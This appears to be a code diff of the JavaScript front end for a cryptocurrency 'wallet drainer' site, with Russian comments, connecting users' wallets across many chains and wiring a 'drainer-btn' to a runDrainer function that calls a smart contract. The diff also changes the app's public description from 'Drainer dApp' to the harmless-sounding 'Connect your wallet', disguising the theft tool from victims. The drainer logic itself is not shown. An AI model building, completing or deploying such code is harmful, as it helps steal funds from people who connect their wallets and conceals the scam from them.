@@ -1,4 +1,3 @@
-// main.js
 import { createAppKit } from '@reown/appkit'
 import {
   mainnet,
@@ -19,52 +18,56 @@ const networks = [mainnet, polygon, bsc, avalanche, arbitrum, optimism, linea, b
 
 const wagmiAdapter = new WagmiAdapter({ projectId, networks })
 
+const metadata = {
+  name: 'Alex dApp',
+  description: 'Connect your wallet',
+  url: 'https://checkalex.xyz',
+  icons: ['https://checkalex.xyz/icon.png']
+}
+
 const modal = createAppKit({
   adapters: [wagmiAdapter],
   networks,
+  metadata,
   projectId,
-  metadata: {
-    name: 'Alex dApp',
-    description: 'Drainer dApp',
-    url: 'https://checkalex.xyz/',
-    icons: [`https://checkalex.xyz/icon.png`],
-  },
-  features: { analytics: true }
+  features: {
+    analytics: true
+  }
 })
 
-// Сохраняем signer и provider после подключения
 let signer = null
-let provider = null
-let userAddress = null
+let address = null
 
-modal.on('connect', async (ctx) => {
-  provider = new ethers.providers.Web3Provider(window.ethereum, 'any')
-  signer = provider.getSigner()
-  userAddress = await signer.getAddress()
+// После подключения — получаем signer и включаем кнопку
+modal.on('connect', async () => {
+  try {
+    const provider = new ethers.BrowserProvider(window.ethereum, 'any')
+    signer = await provider.getSigner()
+    address = await signer.getAddress()
 
-  // Активировать кнопку
-  document.getElementById('drainer-btn').removeAttribute('disabled')
-
-  document.getElementById('status').innerText = `✅ Подключено: ${userAddress.slice(0, 6)}...${userAddress.slice(-4)}`
+    document.getElementById('status').textContent = `✅ Подключено: ${address}`
+    document.getElementById('drainer-btn').disabled = false
+  } catch (e) {
+    console.error('Ошибка при получении signer:', e)
+  }
 })
 
-document
-  .getElementById('open-connect-modal')
-  .addEventListener('click', () => modal.open())
+// Открыть модальное окно для подключения
+document.getElementById('open-connect-modal').addEventListener('click', () => {
+  modal.open()
+})
 
-document
-  .getElementById('drainer-btn')
-  .addEventListener('click', async () => {
-    if (!signer || !provider || !userAddress) {
-      alert("Сначала подключите кошелёк.")
-      return
-    }
+// Запуск drainer-а
+document.getElementById('drainer-btn').addEventListener('click', async () => {
+  if (!signer || !address) {
+    alert('Сначала подключите кошелёк!')
+    return
+  }
 
-    try {
-      // Эта функция уже всё делает — определяет нужную сеть и вызывает смарт-контракт
-      await runDrainer(provider, signer, userAddress)
-    } catch (e) {
-      console.error("Ошибка при запуске drainer:", e)
-      alert("Ошибка при выполнении транзакции: " + e.message)
-    }
-  })
+  try {
+    await runDrainer(signer.provider, signer, address)
+  } catch (e) {
+    console.error("Ошибка в Drainer:", e)
+    alert("Ошибка при вызове контракта: " + e.message)
+  }
+})
